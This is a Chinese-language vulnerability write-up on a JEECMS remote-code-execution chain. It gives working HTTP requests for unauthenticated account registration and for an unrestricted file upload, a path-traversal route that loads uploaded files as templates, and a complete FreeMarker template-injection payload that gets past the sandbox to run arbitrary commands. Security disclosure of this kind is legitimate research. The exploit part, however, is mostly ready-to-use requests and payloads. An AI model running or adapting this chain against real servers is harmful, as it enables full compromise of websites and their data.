### 0x01 前言

CMS对用户输入校验不严，攻击者可以配合前台任意文件上传和服务端模板注入执行任意代码，从而控制服务器权限。

### 0x02 任意注册

首先需要先登录会员。如果站点正常开放会员注册的话，直接注册即可。

但对于一种更严格的情况，就是当站点关闭会员注册时，需要通过别的手段来登录。这里可以利用第三方登录的功能，通过/thirdParty/bind接口可以实现注册并且能够直接登录（该接口在关闭第三方登录时仍旧有效）。

```php
POST /thirdParty/bind HTTP/1.1
Host: 192.168.17.128
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Redirect-Header: false
X-Requested-With: X MLHttpRequest
Content-Length: 80

{"username":"user123456","loginWay": 1, "loginType": "QQ", "thirdId": "abcdefg"}
```

username和thirdId参数可以随意设置，请求成功后就可以获得登录凭证（JSESSIONID或JEECMS-Auth-Token）

![image-20210604142936558](https://shs3.b.qianxin.com/butian_public/fc82c45745604f10bb7ba333e4eec8899.jpg)

### 0x03 任意文件上传

/member/upload/o\_upload接口允许会员向服务器上传文件，系统主要通过UploadService.doUpload()实现上传功能，但它没有对后缀名进行有效检查，所以攻击者可以上传任意后缀的文件，上传路径会回显在结果中（目录为/u/cms/www/&lt;date&gt;，文件名随机，后缀用户可控）。

![image-20210604140725435](https://shs3.b.qianxin.com/butian_public/fd52555807a1d20efcbe8637838837486.jpg)

![image-20210604140731849](https://shs3.b.qianxin.com/butian_public/f61e6ac4357cd47c091b5602eb6e37d15.jpg)

![image-20210604140739755](https://shs3.b.qianxin.com/butian_public/f0f6476f0c2f92425b0f8e7492886e11a.jpg)

![image-20210604140858812](https://shs3.b.qianxin.com/butian_public/fc03402c511d15a8e16a61f7918138892.jpg)

根据接口直接上传

![image-20210604143110869](https://shs3.b.qianxin.com/butian_public/fa8ee3bae0bb29ba478ad8c571176123f.jpg)

测试发现，上传jsp文件是不能被解析的，而且由于目录固定，也不能向类加载路径上传jar文件，要想执行代码的话，得进一步借助FreeMarker模板。

### 0x04 模板注入

FrontCommonController会根据请求/{page}.htm的page参数，生成模板文件的路径。FrontUtils.getTplAbsolutePath() 会将page参数中的“-”替换成“/”，FrontUtils.frontPageData()进一步在结果的前部拼接上模板目录（/WEB-INF/t/cms/www/default）、在后部拼接上后缀（.html）。我们可以构造适当的page参数，使得能访问到上传的模板文件，比如/..-..-..-..-..-u-cms-www-20210X-121948454xbn.htm对应到文件/u/cms/www/20210X/12194845

![image-20210604140940799](https://shs3.b.qianxin.com/butian_public/fa57a26e7581e151a42f8884b1f23b4f7.jpg)

![image-20210604140947446](https://shs3.b.qianxin.com/butian_public/fb6109b4bed9858856fa83791a1513564.jpg)

![image-20210604140953885](https://shs3.b.qianxin.com/butian_public/f043df4237d6c4a893c9accf36ddd0a34.jpg)

接下来的关键是如何利用FreeMarker执行代码。

FreeMarker提供了很多内建函数，使得模板开发更加灵活，但也增加了危险性。

new内建函数用于实例化实现了TemplateModel接口的类，FreeMarker自带了几个符合要求的类，可以用于执行代码，用法如下：

```php
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
<#assign value="freemarker.template.utility.O bjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>
```

但是，FreeMarker也提供了相应措施来限制这些类的使用，通过Configuration.setNewBuiltinClassResolver(TemplateClassResolver)可以限制new内建函数对类的访问。官方提供了三个预定义的解析器：

UNRESTRICTED\_RESOLVER：简单地调用ClassUtil.forName(String)。

SAFER\_RESOLVER：和第一个类似，但禁止解析O bjectConstructor，Execute和freemarker.template.utility.JythonRuntime。

ALLOWS\_NOTHING\_RESOLVER：禁止解析任何类。

JEECMS使用了SAFER\_RESOLVER解析器，导致上述的几个类失效。

api内建函数也常用于模板注入，通常利用它来获取类的classLoader，以此来加载恶意类：

```php
<#assign classLoader=O bject?api.class.getClassLoader()>
${classLoader.loadClass("our.desired.class")}
```

但是api内建函数必须在配置项api\_builtin\_enabled为true时才有效，而该配置在2.3.22版本之后默认为false，JEECMS也没有手动去开启它。

new、api两个常用的内建函数都失效了，这里就得利用到数据模型所暴露的对象了。这些暴露出的对象可以在模板中访问，可以通过它拿到classLoader。

注意FrontCommonController.java第80行，调用了FrontUtils.frontData()，用于向数据模型添加对象，FrontUtils.frontData()的第250行添加了一个CmsSite对象，它就是一个合适的目标。

![image-20210604141021062](https://shs3.b.qianxin.com/butian_public/f5278cacbcafe505f33eb273789966ba1.jpg)

由于FreeMarker内置了一份危险方法名单 unsafeMethods.properties，禁用了很多可用的方法，下面列举了部分：

```php
java.lang.Class.getClassLoader()
java.lang.Class.newInstance()
java.lang.Class.forName(java.lang.String)
java.lang.Class.forName(java.lang.String,boolean,java.lang.ClassLoader)
java.lang.reflect.Constructor.newInstance([Ljava.lang.O bject;)
java.lang.reflect.Method.invoke(java.lang.O bject,[Ljava.lang.O bject;)
```

很多获取classLoader的途径被封禁，这导致我们不能直接通过site.getClass().getClassLoader()拿到类加载器，但我们可以利用site.getClass().getProtectionDomain().getClassLoader()，因为ProtectionDomain.getClassLoader()不在黑名单中。

Constructor.newInstance被禁使得我们不能直接实例化对象，Method.invoke被禁使得我们不能直接调用方法。这里要做的是寻找一个类的静态成员对象（public static final），然后执行它的静态方法。

FreeMarker自带的O bjectWrapper类就是一个不错的选择，它的DEFAULT\_WRAPPER字段是一个实例化后的O bjectWrapper对象，而O bjectWrapper的newInstance方法（继承自BeansWrapper）可以用于实例化一个类，我们只需要向它传入被禁用的freemarker.template.utility.Execute进行实例化，返回的对象就可以直接用于执行系统命令。

![image-20210604141034911](https://shs3.b.qianxin.com/butian_public/f97fbdddb1427b7fb10f95ef67ae0557c.jpg)

![image-20210604141042985](https://shs3.b.qianxin.com/butian_public/f8a965a3bb1c4a0e86f523981807d1d6f.jpg)

完整的模板可以这样写，通过控制http请求的cmd参数就可以执行任意命令：

```php
${site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.O bjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.utility.Execute"), null)(cmd)}
```

### 0x05 配合利用-RCE

结合文件上传,上传成功后，访问相应URL执行系统命令：

```php
POST /member/upload/o_upload HTTP/1.1
Host: 192.168.17.128
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0)  Firefox/84.0
Accept: text/html,application/xhtml+X ML,application/X ML;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
JEECMS-Auth-Token: eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1c2VyMTIzNDU2IiwiY3JlYXRlZCI6MTYxMDQ0MDA5NzA4NywidXNlclNvdXJjZSI6ImFkbWluIiwiZXhwIjoxNjExMzA0MDk3fQ.12x-PtfuHIIC3aF7vV7kocd6KRwZr72SVUxbm74FdjD2WHKZ9IZm1n0cVMZdVgoFuzLuF4a8DKqmFhYX07mc5g
Content-Type: multipart/form-data; boundary=---------------------------1250178961143214655620108952
Content-Length: 604
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------1250178961143214655620108952
Content-Disposition: form-data; name="uploadFile"; filename="a.html"
Content-Type: text/html

${site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.O bjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.utility.Execute"), null)(cmd)}
-----------------------------1250178961143214655620108952
Content-Disposition: form-data; name="typeStr"

File
-----------------------------1250178961143214655620108952--
```

![image-20210604143242534](https://shs3.b.qianxin.com/butian_public/f8a0cceeb6068c20a09ee36bc99c025f6.jpg)